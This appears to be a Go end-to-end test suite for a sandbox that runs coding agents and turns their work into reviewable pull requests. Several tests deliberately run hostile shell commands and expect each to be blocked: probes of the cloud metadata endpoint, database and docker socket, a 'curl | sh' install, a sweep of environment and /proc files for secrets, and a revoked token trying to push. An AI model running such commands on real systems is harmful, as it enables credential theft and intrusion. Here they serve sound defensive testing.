//go:build e2e

// Package e2e drives a running stack from outside: scripts/dev.sh up -d first.
// Agents here are shell commands, which is what makes the failures repeatable.
package e2e

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"
)

type run struct {
	ID, State, Code, Owner, Preview string
	Epoch                           int
	HeadSHA                         string `json:"head_sha"`
	Detail                          json.RawMessage
}

type event struct {
	Epoch int
	Kind  string
	Body  map[string]any
}

func call(t *testing.T, method, path string, in, out any) int {
	t.Helper()
	b, _ := json.Marshal(in)
	req, _ := http.NewRequest(method, "http://127.0.0.1:58090"+path, bytes.NewReader(b))
	req.Header.Set("Authorization", "Bearer "+os.Getenv("API_TOKEN"))
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	if out != nil {
		if err := json.Unmarshal(raw, out); err != nil {
			t.Fatalf("%s %s: %d %s", method, path, resp.StatusCode, raw)
		}
	}
	return resp.StatusCode
}

func start(t *testing.T, agent string) string {
	t.Helper()
	var r run
	if code := call(t, "POST", "/runs", map[string]string{"repo": "demo/shop", "title": t.Name(), "agent": agent}, &r); code != 201 {
		t.Fatal(code)
	}
	return r.ID
}

func get(t *testing.T, id string) run {
	t.Helper()
	var r run
	call(t, "GET", "/runs/"+id, nil, &r)
	return r
}

func wait(t *testing.T, id string, limit time.Duration, ok func(run) bool) run {
	t.Helper()
	end := time.Now().Add(limit)
	for {
		r := get(t, id)
		if ok(r) {
			return r
		}
		if time.Now().After(end) {
			t.Fatalf("run %s stuck in %s epoch %d: %s", id, r.State, r.Epoch, dump(t, id))
		}
		time.Sleep(300 * time.Millisecond)
	}
}

func done(r run) bool { return r.State != "queued" && r.State != "running" }

func events(t *testing.T, id string) (ev []event) {
	t.Helper()
	call(t, "GET", "/runs/"+id+"/events", nil, &ev)
	return
}

func dump(t *testing.T, id string) string {
	b, _ := json.Marshal(events(t, id))
	return string(b)
}

func docker(t *testing.T, args ...string) string {
	t.Helper()
	out, err := exec.Command("docker", args...).CombinedOutput()
	if err != nil {
		t.Fatalf("docker %v: %s", args, out)
	}
	return strings.TrimSpace(string(out))
}

func sandboxes(t *testing.T, id string) []string {
	t.Helper()
	return strings.Fields(docker(t, "ps", "-a", "--filter", "label=fenced.run="+id, "--format", "{{.Names}}"))
}

func phaseOutput(t *testing.T, id, phase string) (string, int) {
	t.Helper()
	for _, e := range events(t, id) {
		if e.Kind == "phase" && e.Body["phase"] == phase {
			return fmt.Sprint(e.Body["out"], e.Body["err"]), int(e.Body["exit"].(float64))
		}
	}
	t.Fatalf("no %s phase: %s", phase, dump(t, id))
	return "", 0
}

func finish(t *testing.T, id string) {
	t.Helper()
	call(t, "POST", "/runs/"+id+"/cancel", nil, nil)
}

func TestChangeBecomesAReviewablePullRequest(t *testing.T) {
	id := start(t, `sed -i 's/<h1>Shop/<h1>Corner shop/' src/server.ts; echo junk > node_modules/left-behind`)
	r := wait(t, id, 90*time.Second, done)
	if r.State != "review" {
		t.Fatalf("%+v %s", r, dump(t, id))
	}
	var st struct {
		PRs    []struct{ Head, Base string }
		Checks []struct {
			HeadSHA    string `json:"head_sha"`
			Conclusion string
		}
	}
	resp, _ := http.Get("http://127.0.0.1:59000/_state")
	_ = json.NewDecoder(resp.Body).Decode(&st)
	okPR, okCheck := false, false
	for _, p := range st.PRs {
		okPR = okPR || p.Head == "agent/"+id && p.Base == "main"
	}
	for _, c := range st.Checks {
		okCheck = okCheck || c.HeadSHA == r.HeadSHA && c.Conclusion == "success"
	}
	if !okPR || !okCheck {
		t.Fatalf("%+v", st)
	}

	// Only the sandbox the agent was never in is left.
	if s := sandboxes(t, id); len(s) != 1 || !strings.HasSuffix(s[0], "-verify") {
		t.Fatalf("sandboxes: %v", s)
	}
	if out, _ := exec.Command("docker", "exec", "fenced-"+id+"-1-verify", "ls", "/work/repo/node_modules/left-behind").CombinedOutput(); !strings.Contains(string(out), "No such file") {
		t.Fatalf("the agent's leftovers are in the preview: %s", out)
	}

	body, code := browse(t, r.Preview)
	if code != 200 || !strings.Contains(body, "Corner shop") {
		t.Fatalf("preview %d %s", code, body)
	}
	if _, code := browse(t, strings.Split(r.Preview, "?")[0]); code != 403 {
		t.Fatalf("preview without a link: %d", code)
	}
	if code := call(t, "POST", "/runs/"+id+"/approve", map[string]string{"sha": strings.Repeat("0", 40)}, nil); code != 409 {
		t.Fatalf("approve of another commit: %d", code)
	}
	if code := call(t, "POST", "/runs/"+id+"/approve", map[string]string{"sha": r.HeadSHA}, nil); code != 200 {
		t.Fatalf("approve: %d", code)
	}
	if _, code := browse(t, r.Preview); code != 410 {
		t.Fatalf("preview after approval: %d", code)
	}
	gone(t, id, 60*time.Second)
}

func gone(t *testing.T, id string, limit time.Duration) {
	t.Helper()
	end := time.Now().Add(limit)
	for {
		left := sandboxes(t, id)
		left = append(left, strings.Fields(docker(t, "network", "ls", "-q", "--filter", "label=fenced.run="+id))...)
		if len(left) == 0 {
			return
		}
		if time.Now().After(end) {
			t.Fatalf("left over: %v", left)
		}
		time.Sleep(500 * time.Millisecond)
	}
}

// browse follows the preview redirect with a cookie, the way a browser does.
func browse(t *testing.T, u string) (string, int) {
	t.Helper()
	host := strings.TrimPrefix(strings.SplitN(strings.TrimPrefix(u, "http://"), "/", 2)[0], "")
	_, path, _ := strings.Cut(strings.TrimPrefix(u, "http://"), "/")
	var cookie string
	for range 3 {
		req, _ := http.NewRequest("GET", "http://127.0.0.1:58091/"+path, nil)
		req.Host = host
		if cookie != "" {
			req.Header.Set("Cookie", cookie)
		}
		resp, err := (&http.Client{CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}).Do(req)
		if err != nil {
			t.Fatal(err)
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != 303 {
			return string(b), resp.StatusCode
		}
		for _, c := range resp.Cookies() {
			cookie = c.Name + "=" + c.Value
		}
		path = strings.TrimPrefix(resp.Header.Get("Location"), "/")
	}
	return "", 0
}

func TestSandboxCannotReachOrReadAnythingElse(t *testing.T) {
	gateNet := docker(t, "inspect", "-f", `{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}`, "fenced-postgres-1")
	id := start(t, `
try() { n=$1; shift; if "$@" >/tmp/o 2>&1; then echo "REACHED $n"; else echo "blocked $n"; fi; }
unset HTTP_PROXY HTTPS_PROXY http_proxy https_proxy
try internet curl -sS -m 3 https://registry.npmjs.org/
try address curl -sS -m 3 https://1.1.1.1/
try metadata curl -sS -m 3 http://169.254.169.254/
try postgres nc -w 2 `+strings.Fields(gateNet)[0]+` 5432
try host curl -sS -m 3 http://172.17.0.1:22/
try api curl -sS -m 3 http://control:8090/healthz
try dns nslookup -timeout=3 example.com
p="http://run:$FENCED_TOKEN@gate:8081"
try proxied-allowed curl -sS -m 8 -o /dev/null -x "$p" https://registry.npmjs.org/
try proxied-other curl -sS -f -m 5 -x "$p" https://example.com/
try proxied-metadata curl -sS -f -m 5 -x "$p" https://169.254.169.254/
try proxied-plain curl -sS -f -m 5 -x "$p" http://registry.npmjs.org/
try docker-socket ls /var/run/docker.sock
try root-write touch /etc/x
git -c user.name=x -c user.email=x@x commit -q --allow-empty -m x
try main-branch git push -q origin HEAD:refs/heads/main
git reset -q --soft HEAD~1
curl -sS "$FENCED_CRED_LLM/v1/messages" -H "X-Api-Key: $FENCED_TOKEN"
(env; cat /proc/*/environ /proc/*/cmdline; git config -l; find / -xdev -type f -size -200k -not -path '/proc/*' -newer /etc/hostname -exec cat {} +) 2>/dev/null | grep -a -c -e 'gh[s]_real' -e 'real-mode[l]-key' | sed 's/^/secrets found: /'
echo x > changed`)
	r := wait(t, id, 120*time.Second, done)
	defer finish(t, id)
	out, _ := phaseOutput(t, id, "agent")
	t.Log(out)
	for _, n := range []string{"internet", "address", "metadata", "postgres", "host", "api", "dns", "proxied-other", "proxied-metadata", "proxied-plain", "docker-socket", "root-write", "main-branch"} {
		if !strings.Contains(out, "blocked "+n+"\n") {
			t.Errorf("%s was not blocked", n)
		}
	}
	if !strings.Contains(out, "REACHED proxied-allowed") {
		t.Error("allowed host was not reachable")
	}
	if !strings.Contains(out, `"answer":"ok"`) {
		t.Error("model call through the gate failed")
	}
	if !strings.Contains(out, "secrets found: 0") {
		t.Error("a real secret is readable in the sandbox")
	}
	if r.State != "review" {
		t.Errorf("%+v", r)
	}
}

func TestFailuresAreExplained(t *testing.T) {
	for _, c := range []struct{ name, agent, code, owner string }{
		{"nothing changed", `true`, "no_changes", "agent"},
		{"memory", `node -e 'const a=[];for(;;)a.push(Buffer.alloc(8<<20,1))'`, "agent_oom", "setup"},
		{"blocked host", `curl -sS -f -m 5 https://example.com/install.sh | sh; test -f /tmp/never`, "agent_egress_denied", "setup"},
		{"test failure", `sed -i 's/100 - discountPercent/100 + discountPercent/' src/price.ts`, "checks_failed", "agent"},
		{"lockfile not updated", `sed -i 's/"hono": "4.12.16"/"hono": "4.12.15"/' package.json`, "lockfile_out_of_date", "agent"},
		{"loopback", `sed -i 's/process.env.HOST/"127.0.0.1"/' src/server.ts`, "preview_loopback_only", "setup"},
		{"wrong port", `sed -i 's/Number(process.env.PORT)/4000/' src/server.ts`, "preview_not_listening", "setup"},
		{"crash", `sed -i 's/^serve(/throw new Error("boot");serve(/' src/server.ts; sed -i 's/throw new Error("boot");/if (process.env.PORT) throw new Error("boot");\n/' src/server.ts`, "preview_crashed", "agent"},
		{"500", `sed -i 's/c.html(.*/{ throw new Error("boom"); });/' src/server.ts`, "preview_http_error", "agent"},
	} {
		t.Run(c.name, func(t *testing.T) {
			id := start(t, c.agent)
			r := wait(t, id, 120*time.Second, done)
			if r.State != "failed" || r.Code != c.code || r.Owner != c.owner {
				t.Errorf("%s %s/%s, want %s/%s: %s", r.State, r.Code, r.Owner, c.code, c.owner, dump(t, id))
			}
			t.Logf("%s: %s", r.Code, r.Detail)
			gone(t, id, 60*time.Second)
		})
	}
}

func waitAgent(t *testing.T, id string) {
	t.Helper()
	end := time.Now().Add(60 * time.Second)
	for {
		for _, e := range events(t, id) {
			if e.Kind == "ready" && e.Body["role"] == "agent" {
				return
			}
		}
		if time.Now().After(end) {
			t.Fatal("agent never started")
		}
		time.Sleep(200 * time.Millisecond)
	}
}

func restartControl(t *testing.T, between func()) {
	t.Helper()
	docker(t, "kill", "fenced-control-1")
	if between != nil {
		between()
	}
	docker(t, "start", "fenced-control-1")
	for range 60 {
		if resp, err := http.Get("http://127.0.0.1:58090/healthz"); err == nil {
			resp.Body.Close()
			return
		}
		time.Sleep(250 * time.Millisecond)
	}
	t.Fatal("control did not come back")
}

func TestKilledWorkerIsReplaced(t *testing.T) {
	id := start(t, `sleep 8; echo one > a`)
	waitAgent(t, id)
	restartControl(t, nil)
	t0 := time.Now()
	r := wait(t, id, 150*time.Second, done)
	t.Logf("recovered in %s", time.Since(t0).Round(time.Second))
	if r.State != "review" || r.Epoch != 2 {
		t.Fatalf("%+v %s", r, dump(t, id))
	}
	if s := sandboxes(t, id); len(s) != 1 || s[0] != "fenced-"+id+"-2-verify" {
		t.Fatalf("sandboxes: %v", s)
	}
	finish(t, id)
	gone(t, id, 60*time.Second)
}

// Needs FAULT_LEAVE_OLD_SANDBOX=1, which makes the takeover behave as if the
// provider could not delete the first sandbox. The first agent is then alive,
// has finished work in hand, and pushes it long after it was replaced.
func TestSandboxThatWasWrittenOffComesBack(t *testing.T) {
	if os.Getenv("FAULT_LEAVE_OLD_SANDBOX") != "1" {
		t.Skip("fault not enabled")
	}
	id := start(t, `
if git ls-remote -q --exit-code origin refs/heads/never >/dev/null; then :; fi
echo "$FENCED_TOKEN" > /tmp/t
if [ ! -f /tmp/second ]; then echo work > stale; fi
sleep 20
echo done > finished`)
	waitAgent(t, id)
	old := "fenced-" + id + "-1-agent"
	// Asleep from before the takeover until after it.
	restartControl(t, func() { docker(t, "pause", old) })
	wait(t, id, 120*time.Second, func(r run) bool { return r.Epoch == 2 })
	docker(t, "unpause", old)
	push := docker(t, "exec", old, "sh", "-c", `cd /work/repo; t=$(cat /tmp/t)
git add -A; git -c user.name=x -c user.email=x@x commit -qm stale || true
a=$(printf 'run:%s' "$t" | base64 | tr -d '\n')
git -c http.extraHeader="Authorization: Basic $a" push origin HEAD:refs/heads/agent/`+id+` 2>&1 || echo PUSH REFUSED
curl -sS -m 5 -o /dev/null -w 'model %{http_code}\n' http://gate:8080/cred/llm/x -H "X-Api-Key: $t"
curl -sS -m 5 -x "http://run:$t@gate:8081" https://registry.npmjs.org/ -o /dev/null -w 'egress %{http_connect}\n' || true`)
	t.Log(push)
	for _, want := range []string{"PUSH REFUSED", "model 401", "egress 403"} {
		if !strings.Contains(push, want) {
			t.Errorf("missing %q", want)
		}
	}
	r := wait(t, id, 150*time.Second, done)
	if r.State != "review" || r.Epoch != 2 {
		t.Fatalf("%+v %s", r, dump(t, id))
	}
	for _, e := range events(t, id) {
		if e.Kind == "push" && e.Epoch != 2 {
			t.Fatalf("push from epoch %d", e.Epoch)
		}
	}
	// Nobody is left who remembers the first sandbox except the ledger.
	end := time.Now().Add(90 * time.Second)
	for strings.Contains(strings.Join(sandboxes(t, id), " "), old) {
		if time.Now().After(end) {
			t.Fatal("the reconciler never removed it")
		}
		time.Sleep(time.Second)
	}
	finish(t, id)
	gone(t, id, 60*time.Second)
}

func TestCancelStopsTheSandbox(t *testing.T) {
	id := start(t, `sleep 100`)
	waitAgent(t, id)
	finish(t, id)
	gone(t, id, 60*time.Second)
	if r := get(t, id); r.State != "cancelled" {
		t.Fatalf("%+v", r)
	}
}

func TestSandboxKilledByTheProviderIsRetried(t *testing.T) {
	id := start(t, `sleep 6; echo one > a`)
	waitAgent(t, id)
	docker(t, "rm", "-f", "fenced-"+id+"-1-agent")
	r := wait(t, id, 120*time.Second, done)
	if r.State != "review" || r.Epoch != 2 {
		t.Fatalf("%+v %s", r, dump(t, id))
	}
	finish(t, id)
	gone(t, id, 60*time.Second)
}

// TestStartTimes prints numbers, it does not judge them.
func TestStartTimes(t *testing.T) {
	var warm []float64
	for range 5 {
		id := start(t, `date > a`)
		wait(t, id, 120*time.Second, done)
		for _, e := range events(t, id) {
			if e.Kind == "ready" && e.Body["start"] == "warm" {
				warm = append(warm, e.Body["ms"].(float64))
			}
		}
		finish(t, id)
		gone(t, id, 60*time.Second)
	}
	docker(t, "exec", "fenced-postgres-1", "psql", "-U", "postgres", "fenced", "-c", "SELECT 1")
	// An npm registry the snapshot cannot help with: change a setup input.
	var cold []float64
	for i := range 5 {
		id := start(t, fmt.Sprintf(`sed -i 's/"private": true/"private": true, "description": "%d"/' package.json`, i))
		wait(t, id, 120*time.Second, done)
		for _, e := range events(t, id) {
			if e.Kind == "ready" && e.Body["start"] == "cold" {
				cold = append(cold, e.Body["ms"].(float64))
			}
		}
		finish(t, id)
		gone(t, id, 60*time.Second)
	}
	t.Logf("warm ms %v", warm)
	t.Logf("setup inputs changed ms %v", cold)
}
